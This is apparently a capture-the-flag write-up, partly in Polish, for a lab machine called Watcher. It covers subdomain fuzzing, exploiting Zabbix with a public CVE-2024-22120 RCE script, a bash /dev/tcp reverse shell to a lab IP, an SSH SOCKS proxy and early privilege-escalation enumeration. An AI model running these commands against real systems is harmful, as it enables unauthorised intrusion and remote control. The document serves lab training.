# Watcher
Linux	Medium	created by **DarkCaT & whatev3n**

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Did not follow redirect to http://watcher.vl/
```

szukamy sub domenek
```
ffuf -u http://watcher.vl/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.watcher.vl" -c -mc all -fs 4991
zabbix                  [Status: 200, Size: 3946, Words: 199, Lines: 33, Duration: 217ms]
```

![{F43BE01A-230F-418B-B6B7-681D3D8FA0BF}](https://github.com/user-attachments/assets/4430e78a-d969-4aca-a972-08784c9628c6)

2001-2023 więc wiemy, że wersja z 2023 roku

![{22B255E3-418C-4741-B532-1C8D78336F90}](https://github.com/user-attachments/assets/27649b84-0b1d-4f90-b839-ef8bce630e41)

zaloguj jako gość działa.

![{13BB3659-80CB-4C27-848C-BA248CEF5F28}](https://github.com/user-attachments/assets/df94fb17-dc15-4b8a-8ed9-c7a2a34a90e2)

ale wróćmy do podatności. Jak 2023 to zakładam exploit z 2023-2024

![{EACCC4F3-7C56-47F6-9C86-3991C6B8FEDE}](https://github.com/user-attachments/assets/e17fc07b-a116-41d6-9ca5-c2d3b4182d4a)

I will try this `https://github.com/W01fh4cker/CVE-2024-22120-RCE`.

we need find `sid` and `hostid`

![{3B75815E-5906-421B-955B-43286C38CEF5}](https://github.com/user-attachments/assets/388e6570-8939-40cd-96d5-56559c6da35f)

hostid in url

![{37BD60F4-0C5C-49F1-BC5E-AC5936CABCB1}](https://github.com/user-attachments/assets/987f0efb-aac3-4efa-a603-a5990f7225a3)

sid in cookie
```
python3 CVE-2024-22120-RCE.py --ip zabbix.watcher.vl --sid a757cb51021879a08e1ffdc47348a0d7 --hostid 10084
```
- 10 minutes of waiting..

So we are zabbix user on main system. Nice

![{E9DE05FF-FA60-4C04-832C-750A56EA83D6}](https://github.com/user-attachments/assets/4ddff038-29c8-4626-a919-481671c6343a)

It is medium.. really?

![{EDF0191B-D5EF-4F09-978C-63E60AD7B737}](https://github.com/user-attachments/assets/fbdd479a-e601-4e1c-bd84-052f80643373)

spawn more stable shell and follow the commends
```
bash -c 'bash -i >& /dev/tcp/10.8.4.124/9001 0>&1'
```

![{604DA508-0AE4-4979-BAC9-7ECF3D28A963}](https://github.com/user-attachments/assets/45b349b5-df18-432c-b5ab-76a77e1d97a4)

![{B3718D34-ED70-49E8-86B4-E7DD6821CCB5}](https://github.com/user-attachments/assets/720c4af3-7fae-46b2-a499-56414067270d)

so it works but we can't create shell. This is not problem.

```
ssh zabbix@10.10.79.86 -i id_rsa -D 1080 -N
```
We created socks proxy without creatign shell.
We don't know what to do so enumerate time (with `nc` shell)

![{C47C2246-8503-4388-BD51-651FD146DB5E}](https://github.com/user-attachments/assets/5b615f30-c02d-4f0e-958e-f6ade9c09079)

Coś zdaje się latać na porcie `8111`

![{5F1C46EC-AABA-47A6-AB55-BC2D8E4E8590}](https://github.com/user-attachments/assets/67d11e44-8929-46b3-8bf5-d4f43bb89233)

Looks like `TeamCity` hehe
Lets upload some enumeration tools on machine. `https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64`

![{67C34E22-C0F9-4F0E-879B-482CA85ACCE9}](https://github.com/user-attachments/assets/0945cb89-3af1-4c9b-b7e4-5c28197ce4fe)

some sort of login script was run

![{E5026A78-90D3-43A7-AF1A-BD8A1F017771}](https://github.com/user-attachments/assets/ebeed451-b1ec-41e2-b9c2-a434802a2ba6)

index.php in `/usr/share/zabbix` was edited today so I think this is a way for escalation.

I also found so password in zabbix config.

![{0CE5E9FF-021A-4AE8-8643-0D4377D3A11E}](https://github.com/user-attachments/assets/845decd3-a25e-4f00-962c-de6c4778b915)
